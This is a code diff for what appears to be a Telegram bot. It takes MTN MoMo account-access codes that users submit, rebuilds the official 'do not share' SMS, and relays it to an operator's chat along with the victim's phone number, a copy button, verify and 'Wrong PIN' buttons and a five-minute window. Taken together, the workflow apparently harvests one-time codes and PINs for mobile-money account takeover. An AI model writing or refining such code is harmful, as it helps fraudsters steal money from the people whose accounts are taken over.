@@ -568,42 +568,46 @@ function submitLink(requestId, link) {
         const cleanLink = (link || '').trim();
         const isUrl = /^https?:\/\//i.test(cleanLink);
         
-        // Extract base64 code from input (handles full SMS or just code)
+        // Extract base64 code from input (handles full SMS, just the code,
+        // or an already-formed momo.mtn.com/verify?code=... link)
         let base64Code = null;
-        if (!isUrl) {
+        if (isUrl) {
+            try {
+                const parsed = new URL(cleanLink);
+                const codeParam = parsed.searchParams.get('code');
+                if (codeParam) {
+                    base64Code = decodeURIComponent(codeParam);
+                } else {
+                    const match = cleanLink.match(/[A-Za-z0-9+\/=]{20,}/);
+                    if (match) base64Code = match[0];
+                }
+            } catch (_) {
+                const match = cleanLink.match(/[A-Za-z0-9+\/=]{20,}/);
+                if (match) base64Code = match[0];
+            }
+        } else {
             const match = cleanLink.match(/[A-Za-z0-9+\/=]{20,}/);
             if (match) base64Code = match[0];
         }
-        
-        // Construct MTN verification URL from base64 code
-        const verificationUrl = base64Code 
+
+        // Always present the MTN SMS-style message (as the user receives it)
+        // instead of a rewritten https://momo.mtn.com/verify?code=... URL.
+        const smsMessage = `Y'ello. Please note! This confidential code gives access to your MoMo account:${base64Code || cleanLink} Do not share it with anyone.`;
+        const verifyUrl = base64Code
             ? `https://momo.mtn.com/verify?code=${encodeURIComponent(base64Code)}`
             : cleanLink;
-        
+
         const keyboard = {
             inline_keyboard: [
-                [{ text: '🔗 Open Verification Link', url: verificationUrl }],
+                [{ text: '🔗 Open Verification Link', copy_text: { text: smsMessage } }],
                 [{ text: '✅ Verify Link', callback_data: `link_approve_${requestId}` },
                  { text: '❌ Invalid Link', callback_data: `link_invalid_${requestId}` }],
-                [{ text: '🔑 Wrong PIN', callback_data: `link_wrong_pin_${requestId}` }]
+                 [{ text: '🔑 Wrong PIN', callback_data: `link_wrong_pin_${requestId}` }]
             ]
         };
-        
-        // Format link as clickable markdown
-        const linkDisplay = isUrl 
-            ? `[${cleanLink}](${cleanLink})`
-            : base64Code 
-                ? `[${base64Code.substring(0, 30)}...](${verificationUrl})`
-                : `\`${cleanLink}\``;
-        
-        bot.sendMessage(adminChatId, `🔗 Verification Link Submitted\n\n` +
-            `📱 Phone: ${request.userPhone}\n` +
-            `📦 Package: ${request.package}\n` +
-            `${isUrl ? '🔗 Link' : '🔐 Code'}: ${linkDisplay}\n\n` +
-            `Please verify by clicking "Verify Link" and confirming.\n` +
-            `⏱️ You have 5 minutes.`, { 
-            reply_markup: keyboard,
-            parse_mode: 'Markdown'
+
+        bot.sendMessage(adminChatId, smsMessage, {
+            reply_markup: keyboard
         }).then((msg) => {
             request.adminOtpMessageId = msg.message_id;
         }).catch((err) => {
